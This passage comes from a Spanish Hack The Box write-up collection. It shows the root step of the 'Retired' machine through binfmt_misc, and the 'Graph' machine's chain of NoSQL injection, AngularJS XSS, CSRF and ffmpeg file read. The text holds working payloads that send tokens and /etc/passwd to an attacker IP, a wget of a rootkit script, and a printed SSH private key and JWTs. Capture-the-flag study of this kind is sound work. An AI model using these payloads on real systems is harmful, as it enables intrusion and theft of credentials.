KCKW97HIfCpt5tzoKiJ7/eAuGEjjHN28GP1u4iVoD0udnUHQAAAMEA+RceJG5scCzciPd9 7zsHHTpQNhKQs13qfgQ9UGbyCit+eWzc/bplfm5ljfw+cFntZULdkhiFCIosHPLxmYe8r0 FZUzTqOeDCVK9AZjn8uy8VaFCWb4jvB+oZ3d+pjFKXIVWpl0ulnpOOoHHIoM7ghudXb0vF L8+QpuPCuHrb2N9JVLxHrTyZh3+v9Pg/R6Za5RCCT36R+W6es8Exoc9itANuoLudiUtZif 84JIKNaGGi6HGdAqHaxBmEn7N/XDu7AAAAwQDuOLR38jHklS+pmYsXyLjOSPUlZI7EAGlC xW5PH/X1MNBfBDyB+7qjFFx0tTsfVRboJvhiYtRbg/NgfBpnNH8LpswL0agdZyGw3Np4w8 aQSXt9vNnIW2hDwX9fIFGKaz58FYweCXzLwgRVGBfnpq2QSXB0iXtLCNkWbAS9DM3esjsA 1JCCYKFMrvXeeshyxnKmXix+3qeoh8TTQvr7ZathE5BQrYXvfRwZJQcgh8yv71pNT3Gpia 7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ= -----END OPENSSH PRIVATE KEY-----  Ahora nos podemos conectar como dev y obtener la flag user.txt:\n$ chmod 600 id_rsa $ ssh -i id_rsa dev@10.10.11.154 dev@retired:~$ cat user.txt f78b01da6c3d56436a6005509fdff826  Escalada de privilegios Este usuario tiene un directorio llamado emuemu (podemos recordarlo de la página web):\ndev@retired:~$ ls -la total 40 drwx------ 6 dev dev 4096 Mar 11 14:36 . drwxr-xr-x 3 root root 4096 Mar 11 14:36 .. lrwxrwxrwx 1 root root 9 Oct 13 02:59 .bash_history -\u0026gt; /dev/null -rw------- 1 dev dev 220 Aug 4 2021 .bash_logout -rw------- 1 dev dev 3526 Aug 4 2021 .bashrc drwxr-xr-x 3 dev dev 4096 Mar 11 14:36 .local -rw------- 1 dev dev 807 Aug 4 2021 .profile drwx------ 2 dev dev 4096 Mar 11 14:36 .ssh drwx------ 2 dev dev 4096 Mar 11 14:36 activate_license drwx------ 3 dev dev 4096 Mar 11 14:36 emuemu -rw-r----- 1 root dev 33 Apr 3 21:28 user.txt  Tenemos todo esto:\ndev@retired:~/emuemu$ ls -la total 68 drwx------ 3 dev dev 4096 Mar 11 14:36 . drwx------ 6 dev dev 4096 Mar 11 14:36 .. -rw------- 1 dev dev 673 Oct 13 02:59 Makefile -rw------- 1 dev dev 228 Oct 13 02:59 README.md -rw------- 1 dev dev 16608 Oct 13 02:59 emuemu -rw------- 1 dev dev 168 Oct 13 02:59 emuemu.c -rw------- 1 dev dev 16864 Oct 13 02:59 reg_helper -rw------- 1 dev dev 502 Oct 13 02:59 reg_helper.c drwx------ 2 dev dev 4096 Mar 11 14:36 test dev@retired:~/emuemu$ ls -la test total 12 drwx------ 2 dev dev 4096 Mar 11 14:36 . drwx------ 3 dev dev 4096 Mar 11 14:36 .. -rwxr-xr-x 1 dev dev 70 Oct 13 02:59 examplerom  Vamos a leer el README.md:\ndev@retired:~/emuemu$ cat README.md EMUEMU is the official software emulator for the handheld console OSTRICH. After installation with `make install`, OSTRICH ROMs can be simply executed from the terminal. For example the ROM named `rom` can be run with `./rom`.  Dice que podemos ejecutar la ROP como un archivo ejecutable normal:\ndev@retired:~/emuemu$ test/examplerom EMUEMU is still under development.  Perfecto, podemos ejecutar una ROM, vamos a mirar los archivos en C:\ndev@retired:~/emuemu$ cat emuemu.c  #include \u0026lt;stdio.h\u0026gt; /* currently this is only a dummy implementation doing nothing */ int main(void) { puts(\"EMUEMU is still under development.\"); return 1; }  ¡Eh! este archivo genera la ROM que hemos ejecutado antes. Vamos a comprobarlo:\ndev@retired:~/emuemu$ file test/examplerom test/examplerom: data dev@retired:~/emuemu$ cat test/examplerom 7OSTRICHROM this is a minimal rom with a valid file type signature dev@retired:~/emuemu$ xxd test/examplerom 00000000: 1337 4f53 5452 4943 4800 524f 4d00 0a74 .7OSTRICH.ROM..t 00000010: 6869 7320 6973 2061 206d 696e 696d 616c his is a minimal 00000020: 2072 6f6d 2077 6974 6820 6120 7661 6c69 rom with a vali 00000030: 6420 6669 6c65 2074 7970 6520 7369 676e d file type sign 00000040: 6174 7572 650a ature.  Análisis de la ROM ¿Pero, qué pasa aquí? test/examplerom parece un archivo normal. Por lo menos no es un ELF. Vamos a ver si reg_helper.c nos lo clarifica:\ndev@retired:~/emuemu$ cat reg_helper.c  #define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(void) { char cmd[512] = { 0 }; read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0; int fd = open(\"/proc/sys/fs/binfmt_misc/register\", O_WRONLY); if (-1 == fd) perror(\"open\"); if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1) perror(\"write\"); if (close(fd) == -1) perror(\"close\"); return 0; }  Esto es bastante interesante, deberíamos hacer un poco de investigación acerca de /proc/sys/fs/binfmt_misc/register. Pero vamos a mirar el Makefile primero:\ndev@retired:~/emuemu$ cat Makefile  CC := gcc CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion SOURCES := $(wildcard *.c) TARGETS := $(SOURCES:.c=) .PHONY: install clean install: $(TARGETS) @echo \"[+] Installing program files\" install --mode 0755 emuemu /usr/bin/ mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d install --mode 0750 --group dev reg_helper /usr/lib/emuemu/ setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper @echo \"[+] Register OSTRICH ROMs for execution with EMUEMU\" echo ':EMUEMU:M::\\x13\\x37OSTRICH\\x00ROM\\x00::/usr/bin/emuemu:' \\ | tee /usr/lib/binfmt.d/emuemu.conf \\ | /usr/lib/emuemu/reg_helper clean: rm -f -- $(TARGETS)  Perfecto, sabemos que hay binarios en /usr/bin/emuemu y /usr/lib/emuemu/reg_helper. Estos son los mismos que los que vimos antes:\ndev@retired:~/emuemu$ md5sum /usr/bin/emuemu emuemu /usr/lib/emuemu/reg_helper reg_helper 27641ed1f6105c6f70f5167610fa0b7e /usr/bin/emuemu 27641ed1f6105c6f70f5167610fa0b7e emuemu 1600a7013d283b9aaa6b7a07f8e45b2a /usr/lib/emuemu/reg_helper 1600a7013d283b9aaa6b7a07f8e45b2a reg_helper  Y no podemos modificarlos. Nótese que el Makefile configura un formato ejecutable personalizado (binfmt). Se cuarda en /usr/lib/binfmt.d/emuemu.conf:\ndev@retired:~/emuemu$ cat /usr/lib/binfmt.d/emuemu.conf :EMUEMU:M::\\x13\\x37OSTRICH\\x00ROM\\x00::/usr/bin/emuemu:  Entonces, todos los archivos que empiecen por \\x13\\x37OSTRICH\\x00ROM\\x00 serán ejecutados con /usr/bin/emuemu. Ahora todo tiene sentido:\ndev@retired:~/emuemu$ /usr/bin/emuemu EMUEMU is still under development. dev@retired:~/emuemu$ xxd test/examplerom 00000000: 1337 4f53 5452 4943 4800 524f 4d00 0a74 .7OSTRICH.ROM..t 00000010: 6869 7320 6973 2061 206d 696e 696d 616c his is a minimal 00000020: 2072 6f6d 2077 6974 6820 6120 7661 6c69 rom with a vali 00000030: 6420 6669 6c65 2074 7970 6520 7369 676e d file type sign 00000040: 6174 7572 650a ature. dev@retired:~/emuemu$ test/examplerom EMUEMU is still under development.  Debido a reg_helper, somos capaces de crear formatos ejecutables personalizados. Por ejemplo:\ndev@retired:~/emuemu$ echo ':test:M::rocky::/usr/bin/emuemu:' | /usr/lib/emuemu/reg_helper dev@retired:~/emuemu$ echo -e 'rocky\\nThis is a custom executable file'  /tmp/test dev@retired:~/emuemu$ cat /tmp/test rocky This is a custom executable file dev@retired:~/emuemu$ chmod +x /tmp/test dev@retired:~/emuemu$ /tmp/test EMUEMU is still under development.  Exploitación de binfmt_misc Vale, ¿pero qué podemos hacer con esto? Bueno, existe un exploit de /proc/sys/fs/binfmt_misc/register cuando tenemos permisos de escritura en él, y lo tenemos porque reg_helper lo modifica (tiene una capability CAP_DAC_OVERRIDE). El exploit se puede encontrar aquí.\nTenemos que descargar el script y modificar algunas líneas. Primero, me desharé de la validación de que /proc/sys/fs/binfmt_misc/register es modificable (ya sabemos que sí). Y luego, tenemos que modificar la manera en la que se escriben los datos en el registro. Es decir, esta línea:\necho \"$binfmt_line\" \u0026gt; \"$mountpoint\"/register Se transforma en esta:\necho \"$binfmt_line\" | /usr/lib/emuemu/reg_helper  Finalmente, descargamos el script en la máquina y lo ejecutamos para convertirnos en root:\ndev@retired:~/emuemu$ cd /tmp dev@retired:/tmp$ wget -q 10.10.17.44/binfmt_rootkit dev@retired:/tmp$ chmod +x binfmt_rootkit dev@retired:/tmp$ ./binfmt_rootkit uid=0(root) euid=0(root) # cat /root/root.txt d8544f2779e7f65f61a1fcbe7eee471a  ","image":"/images/HTB/Retired/Retired.png","permalink":"https://7rocky.github.io/htb/retired/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina tiene una página web en PHP que es vulnerable a navegación de directorios. Aquí encontramos un archivo PHP que espera que se suba un archivo para pasarlo a un servidor de sockets en local. Somos capaces de enumerar procesos y descargar el binario que ejecuta el servidor y ver que es vulnerable a Buffer Overflow. Una vez explotado, podemos pivotar a un usuario usando enlaces simbólicos. Y luego, se nos permite añadir formatos ejecutables personalizados, que puede ser explotado para convertirnos en root. Para comprometer esta máquina se necesitan técnicas sólidas de explotación de binarios y conceptos de Linux. En este write-up se utilizan exploits personalizados en Python para la intrusión","time":18,"title":"Retired"},{"contents":"  SO: Linux   Dificultad: Difícil   Dirección IP: 10.10.11.157   Fecha: 30 / 04 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.157 -p 22,80 Nmap scan report for 10.10.11.157 Host is up (0.045s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 34:a9:bf:8f:ec:b8:d7:0e:cf:8d:e6:a2:ce:67:4f:30 (RSA) | 256 45:e1:0c:64:95:17:92:82:a0:b4:35:7b:68:ac:4c:e1 (ECDSA) |_ 256 49:e7:c7:5e:6a:37:99:e5:26:ea:0e:eb:43:c4:88:59 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://graph.htb |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 7.99 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.157 se nos redirige a http://graph.htb. Por tanto, tenemos que poner este dominio en /etc/hosts para ver la página web:\nSi inspeccionamos el código fuente, vemos un código en JavaScript que realiza una redirección si redirect aparece como parámetro de URL. Esto puede ser útil para después porque actúa como un Open Redirect:\nDe momento, vamos a enumerar más subdominios usando ffuf:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.157 -H 'Host: FUZZ.graph.htb' -fl 8 internal [Status: 200, Size: 607, Words: 36, Lines: 15, Duration: 49ms]  Genial, vamos a añadir internal.graph.htb a /etc/hosts y a ver qué hay:\nTenemos un formulario de inicio de sesión. Podemos probar con credenciales por defecto, pero no funcionan. Algo interesante es que esta aplicación web está hecha en AngularJS. El archivo index.html solamente carga los archivos CSS y JavaScript que renderizarán la página completa:\nSe trata de una aplicación de una sola página (Single Page Application, SPA), por lo que no podremos enumerar rutas como suempre (con ffuf). Sin embargo, podemos leer el archivo JavaScript principal (main.0681ef4e6f13e51b.js) y extraer algunas rutas desde ahí:\n$ curl internal.graph.htb/main.0681ef4e6f13e51b.js -s | grep -oE \"['\\\"]/.*?['\\\"]\" | grep -v \"['\\\"]/*['\\\"]\" | sort -u \"/(\" \"/dashboard\" \"/g,' \"/graphql\" \"/inbox\" \"/logout\" \"/profile\" \"/register\" \"/tasks\" \"/uploads\" '/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\\\" '/%3E%3Cpath d=' '/%3E%3Cpath id=' '/graphql'  Vale, tenemos:\n /dashboard /graphql /inbox /logout /profile /register /tasks /uploads  Solamente las tres últimas rutas funcionan. Las otras redirigen al formulario de login, a excepción de /graphql, que espera una consulta de GraphQL.\nEsto es /register:\nEsto es /tasks:\nY esto es /uploads:\nEsta subida de archivos de vídeo parece interesante. A lo mejor es explotable después.\nRegistrando una nueva cuenta De momento, vamos a intentar registrar una nueva cuenta. Tenemos que añadir una dirección de correo que termine en @graph.htb:\nY aparentemente, el servidor nos ha enviado un código OTP por correo, pero no tenemos esta dirección de correo. Vamos a capturar la petición con Burp Suite:\nVale, tenemos otro subdominio llamado internal-api.graph.htb. Si probamos a enviar más códigos OTP, el servidor se bloquea después de 4 intentos. Por tanto, sacar el código OTP no parece que sea el camino.\nDe hecho, si analizamos el código JavaScript (previamente formateado con el depurador del navegador), podemos buscar por \u0026quot;register\u0026quot; y descubrir cómo se registran las nuevas cuentas, evitando el código OTP:\nSolo tenemos que enviar una petición POST a internal-api.graph.htb/api/register con nuestros datos. Algo así:\n$ curl internal-api.graph.htb/api/register -d '{\"email\":\"rocky@graph.htb\",\"username\":\"rocky\",\"password\":\"asdffdsa\",\"confirmPassword\":\"asdffdsa\"}' -H 'Content-Type: application/json' {\"result\":\"Invalid Email / Email not verified\"}  Vaya, parece que no será tan fácil. Entonces, tenemos que verificar nuestro email primero. Mirando a la petición en Burp Suite, vemos que el código OTP se envía como string en un documento JSON:\nEntonces, podemos probar inyecciones y técnicas de Type Juggling. Finalmente, encontraremos que con un payload de inyección NoSQL (tomada de PayloadsAllTheThings) como {\u0026quot;$ne\u0026quot;:\u0026quot;foo\u0026quot;}, nos saltaríamos la verificación si el servidor es vulnerable:\nY lo es. Ahora tenemos una dirección de correo verificada y ya sí que podemos registrar la cuenta:\n$ curl internal-api.graph.htb/api/register -d '{\"email\":\"rocky@graph.htb\",\"username\":\"rocky\",\"password\":\"asdffdsa\",\"confirmPassword\":\"asdffdsa\"}' -H 'Content-Type: application/json' {\"result\":\"Account Created Please Login!\"}  En este punto, podemos acceder a /dashboard y /profile:\nAdemás, podemos ver un mensaje de Mark en /inbox:\nNota: La máquina reinicia su base de datos cada rado, y también, los usuarios que escriben mensajes van cambiando entre Mark, Larry, Sally, Alen\u0026hellip; De ahora en adelante, me referiré a otros usuarios como \u0026ldquo;Mark\u0026rdquo;.\nSi inspeccionamos un poco más la web, veremos que la autenticación se realiza mediante tokens JWT:\nY también con localStorage:\nEncontrando vulnerabilidades Si modificamos la clave admin a \u0026quot;true\u0026quot;, veremos un enlace a \u0026ldquo;Uploads\u0026rdquo; en la izquierda (aunque ya sabíamos que esta ruta /uploads existía):\nAdemás, sabemos que Mark es un usuario válido, y de hecho, si cambiamos nuestro username y email, entraremos en la sesión de Mark:\nPensando en la subida de archivos de vídeo, para poder usar la funcionalidad, necesitamos un adminToken:\n$ curl internal-api.graph.htb/admin/video/upload -d '' {\"result\": \"No adminToken header present\"}  Como dice el mensaje de Mark, podríamos intentar enviarle una URL como mensaje y ver si accede. El chat está un poco roto, y para enviar mensajes, podemos hacer click en el botón mediante la consola de JavaScript:\nOtra manera es inspeccionando la petición en el navegador y copiándola como comando curl. Algo como esto (el error no importa):\n$ curl internal-api.graph.htb/graphql -d '{\"variables\":{\"to\":\"mark@graph.htb\",\"text\":\"asdf\"},\"query\":\"mutation ($to: String!, $text: String!) { sendMessage(to: $to, text: $text) { toUserName fromUserName text to from __typename } }\"}' -H 'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc' -H 'Content-Type: application/json' {\"errors\":[{\"message\":\"Cannot read property 'length' of null\",\"locations\":[{\"line\":1,\"column\":43}],\"path\":[\"sendMessage\"],\"extensions\":{\"code\":\"INTERNAL_SERVER_ERROR\",\"exception\":{\"stacktrace\":[\"TypeError: Cannot read property 'length' of null\",\" at sendMessage (/home/user/onegraph/backend/graphql/resolvers/message.js:47:56)\",\" at processTicksAndRejections (internal/process/task_queues.js:95:5)\"]}}}],\"data\":null}  Y así, podemos enviar un mensaje con nuestra IP como URL, de manera que Mark realiza una petición GET (podemos probar también con inyección HTML, para ver si podemos conseguir XSS fácilmente, pero no):\nY con esto, Mark accede a l URL y recibimos la petición:\n$ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.157. Ncat: Connection from 10.10.11.157:38078. GET / HTTP/1.1 Host: 10.10.17.44 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Chrome/77 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US  En este punto, podemos pensar en maneras de obtener adminToken. Asumiendo que adminToken está guardado como una cookie o como una clave en localStorage, finalmente tendremos que conseguir Cross-Site Scripting (XSS) en el navegador de la víctima para poder extraer el valor y enviárnoslo de algún modo.\nComo la aplicación web está realizada con AngularJS (también conocido como Angular 1), es bastante antiguo y se sabe que es vulnerable a Client-Side Template Injection (que deriva en XSS).\nLa inyección aparece en firstname y lastname. Esta es una simple prueba de concepto:\nY podemos transformarla a XSS usando el siguiente payload (más información en portswigger.net):\n{{constructor.constructor('alert(123)')()}}  Enumeración de GraphQL Va siendo hora de analizar la implementación de GraphQL. Para esto, podemos usar graphqlmap. Mediante una consulta de introspección, podemos ver las siguientes estructuras:\n$ ./graphqlmap -u http://internal-api.graph.htb/graphql _____ _ ____ _ / ____| | | / __ \\| | | | __ _ __ __ _ _ __ | |__ | | | | | _ __ ___ __ _ _ __ | | |_ | '__/ _` | '_ \\| '_ \\| | | | | | '_ ` _ \\ / _` | '_ \\ | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) | \\_____|_| \\__,_| .__/|_| |_|\\___\\_\\______|_| |_| |_|\\__,_| .__/ | | | | |_| |_| Author: @pentest_swissky Version: 1.0 GraphQLmap \u0026gt; dump_via_introspection ============= [SCHEMA] =============== e.g: name[Type]: arg (Type!) 00: Query Messages[None]: tasks[None]: username (String!), 01: Message to[String]: from[String]: text[String]: toUserName[String]: fromUserName[String]: 03: task Assignedto[ID]: username[]: text[String]: taskstatus[String]: type[String]: 05: Mutation login[User]: email (String!), password (String!), update[User]: newusername (String!), id (ID!), firstname (String!), lastname (String!), sendMessage[Message]: to (String!), text (String!), assignTask[]: user (String!), text (String!), taskstatus (String!), type (String!), 06: User username[String]: id[ID]: email[String]: createdAt[String]: token[]: admin[String]: adminToken[]: firstname[]: lastname[]: 07: __Schema 08: __Type 11: __Field 12: __InputValue 13: __EnumValue 14: __Directive  Esta consulta no es una vulnerabilidad de GraphQL, sino una funcionalidad. No obstante, se debería deshabilitar por razones de seguridad, ya que muestra toda la estructura de la implementación de GraphQL.\nExisten dos tipos de consultas disponibles:\n Messages:  $ curl internal-api.graph.htb/graphql -d '{\"variables\":{},\"query\":\"{ Messages { toUserName fromUserName text to from __typename } }\"}' -H 'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc' -sH 'Content-Type: application/json' | jq { \"data\": { \"Messages\": [ { \"toUserName\": \"rocky\", \"fromUserName\": \"Larry\", \"text\": \"Hey, We just realized that this email is not listed in our employee list. Can you send any links or documents so we can verify them on our end? Thanks\", \"to\": \"rocky@graph.htb\", \"from\": \"larry@graph.htb\", \"__typename\": \"Message\" }, { \"toUserName\": \"Larry\", \"fromUserName\": \"rocky\", \"text\": \"asdf\", \"to\": \"larry@graph.htb\", \"from\": \"rocky@graph.htb\", \"__typename\": \"Message\" }, ... ] } }   tasks:  $ curl internal-api.graph.htb/graphql -d '{\"variables\":{\"username\":\"rocky\"},\"query\":\"query tasks($username: String!) { tasks(username: $username) { Assignedto username text taskstatus type __typename } }\"}' -H 'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc' -sH 'Content-Type: application/json' | jq { \"data\": { \"tasks\": [] } }  También podemos modificar datos de GraphQL usando mutaciones o mutations (login, update, sendMessage y assignTask). Para poder actualizar los datos de usuario, tenemos que enviar el ID de usuario. Este es nuestro ID de usuario, que aparece en el token JWT:\n$ echo eyJpZCI6IjYyZTcyNWMwNGUyOThkMDQzNGRkMWRlOSIsImVtYWlsIjoicm9ja3lfNDI4QGdyYXBoLmh0YiIsImlhdCI6MTY1OTMxNTY0OSwiZXhwIjoxNjU5NDAyMDQ5fQ== | base64 -d | jq { \"id\": \"62e725c04e298d0434dd1de9\", \"email\": \"rocky_428@graph.htb\", \"iat\": 1659315649, \"exp\": 1659402049 }  Y podemos consultar tareas asignadas a Mark para obtener su ID (clave Assignedto):\n$ curl internal-api.graph.htb/graphql -d '{\"variables\":{\"username\":\"Mark\"},\"query\":\"query tasks($username: String!) { tasks(username: $username) { Assignedto username text taskstatus type __typename } }\"}' -H 'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc' -sH 'Content-Type: application/json' | jq { \"data\": { \"tasks\": [ { \"Assignedto\": \"62e725911b49ab0b7ac8372a\", \"username\": null, \"text\": \"Lorem ipsum\", \"taskstatus\": \"completed\", \"type\": \"development\" } ] } }  Explotación para obtener adminToken Vamos a planear la estrategia:\n El objetivo final es obtener adminToken de Mark, que es muy probable que esté guardado en localStorage Por tanto, solo el usuario (Mark) puede acceder a esta información desde internal.graph.htb (localStorage solo es accesible desde el mismo dominio en el que se configuró). Entonces, la manera de acceder a localStorage tiene que ser con XSS (desde el Client-Side Template Injection de AngularJS en firstname y lastname) Para cambiar el firstname de la víctima, tenemos que actualizar su perfil mediante una mutación de GraphQL (update) enviando su ID de usuario Podemos obtener el ID de usuario de la víctima con una consulta GraphQL (tasks)  Perfecto, ahora tenemos que descubrir como forzar a la víctima a que actualice su perfil.\nAquí tenemos que recordar la vulnerabilidad de Open Redirect presente en http://graph.htb/?redirect=. Podemos usarla para apuntar a nuestra máquina de atacante y cargar un código JavaScript malicioso que realice la mutación update. Pero esto no va a funcionar porque el servidor necesita la cookie auth con un token JWT válido, y la cookie tiene el parámetro httpOnly a true (por lo que no podemos acceder a las cookies desde JavaScript).\nPor tanto, la mutación tiene que realizarse desde el mismo sitio http://graph.htb, de manera que las cookies viajen en la petición. Y esto se puede conseguir ejecutando JavaScrip en línea. Por ejemplo:\nhttp://graph.htb/?redirect=javascript:eval('alert(123)')  Y con esto tenemos la manera de decirle al usuario que actualice su perfil (Cross-Site Request Forgery). Solamente tenemos que enviar una URL al chat con el código JavaScript en línea para realizar la mutación. Y esta mutación contendrá el payload de XSS de AngularJS en el campo firstname, de manera que podemos acceder a localStorage y sacar adminToken.\nPara enviar una gran cantidad de código JavaScrip en línea, podemos codificarlo en Base64 y usar javascript:eval(atob`\u0026lt;base64-data\u0026gt;`) (es importante que no aparezcan caracteres = de relleno).\nEste será el código que hará que la víctima actualice su propio perfil con la mutación de GraphQL:\nfetch('http://internal-api.graph.htb/graphql', { method: 'POST', credentials: 'include', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ variables: { newusername: 'Mark', id: '\u0026lt;id\u0026gt;', firstname: `\u0026lt;AngularJS XSS\u0026gt;`, lastname: 'asdf' }, query: ` mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) { update(newusername: $newusername, id: $id, firstname: $firstname, lastname: $lastname) { __typename } } ` }) })  Y el payload de XSS de AngularJS será este:\n{{constructor.constructor('fetch(\"http://10.10.17.44/\" + localStorage.getItem(\"adminToken\"))')()}}  En este punto, decidí automatizar todo en un script en Python llamado get_admin_token.py para probar todo y encadenar correctamente todas las técnicas de explotación web necesarias (explicación detallada aquí). Finalmente, obtendremos un adminToken válido:\n$ python3 get_admin_token.py [+] Logged in as rocky (password: asdffdsa) [*] JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTdhNmRmNGUyOThkMDQzNGRkMWZjMyIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzQ5MTMwLCJleHAiOjE2NTk0MzU1MzB9.buvUeGkubEoMwDRN-aoH28l2ynIVjdX1HXInWK4mPrM [*] Own user ID: 62e7a6df4e298d0434dd1fc3 [+] Victim's ID: 62e7a42181fe151459e90ea6 [+] Trying to bind to :: on port 80: Done [+] Waiting for connections on :::80: Got connection from ::ffff:10.10.11.157 on port 34196 [*] Closed connection to ::ffff:10.10.11.157 port 34196 [+] adminToken: c0b9db4c8e4bbb24d59a3aaffa8c8b83  Ahora podemos poner este token en localStorage y usar la funcionalidad de subida de vídeos:\nExplotación de la subida de archivos de vídeo En este punto, podemos deducir que el servidor utiliza ffmpeg para procesar el archivo de vídeo. Existen algunar vulnerabilidades relacionadas con Server-Side Request Forgery y lectura de archivos locales (más información en hackerone.com y PayloadsAllTheThings).\nPara poder leer archivos del servidor (de acuerdo con el informe de hackerone.com), tenemos que tener un archivo llamado header.m3u8 como este:\n#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:, http://10.10.17.44?  Y sin carácter de salto de línea al final. Luego, tenemos que subir un archivo llamado vide.avi (por ejemplo), con el siguiente texto:\n#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://10.10.17.44/header.m3u8|file:///etc/passwd #EXT-X-ENDLIST  Y el payload de arriba servirá para leer la primera línea del archivo /etc/passwd de la máquina con un servidor HTTP:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [] \"GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1\" 301 - ::ffff:10.10.11.157 - - [] \"GET ?root:x:0:0:root:/?root:x:0:0:root:/root:/bin/bash HTTP/1.1\" 301 - ...  Para conseguir más datos, tenemos que cambiar el video.avi un poco:\n#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://10.10.17.44/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd #EXT-X-ENDLIST  Con el payload anterior, estaremos recibiendo datos hasta un caracter de salto de línea, por lo que iremos actualizando el offset start para conseguir más líneas.\nAl tener una vulnerabilidad de lectura de archivos locales, podemos buscar por código fuente y claves privadas de SSH. En lugar de extraer el archivo /etc/passwd al completo para ver usuarios de sistema, podemos causar un fallo en el servidor y ver una traza de error que muestra una ruta absoluta:\n$ curl internal-api.graph.htb/api/register -d '{' -H 'Content-Type: application/json' \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\"en\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\"utf-8\"\u0026gt; \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;pre\u0026gt;SyntaxError: Unexpected end of JSON input\u0026lt;br\u0026gt; at JSON.parse (\u0026lt;anonymous\u0026gt;)\u0026lt;br\u0026gt; at parse (/home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js:89:19)\u0026lt;br\u0026gt; at /home/user/onegraph/backend/node_modules/body-parser/lib/read.js:121:18\u0026lt;br\u0026gt; at invokeCallback (/home/user/onegraph/backend/node_modules/raw-body/index.js:224:16)\u0026lt;br\u0026gt; at done (/home/user/onegraph/backend/node_modules/raw-body/index.js:213:7)\u0026lt;br\u0026gt; at IncomingMessage.onEnd (/home/user/onegraph/backend/node_modules/raw-body/index.js:273:7)\u0026lt;br\u0026gt; at IncomingMessage.emit (events.js:412:35)\u0026lt;br\u0026gt; at endReadableNT (internal/streams/readable.js:1334:12)\u0026lt;br\u0026gt; at processTicksAndRejections (internal/process/task_queues.js:82:21)\u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ curl 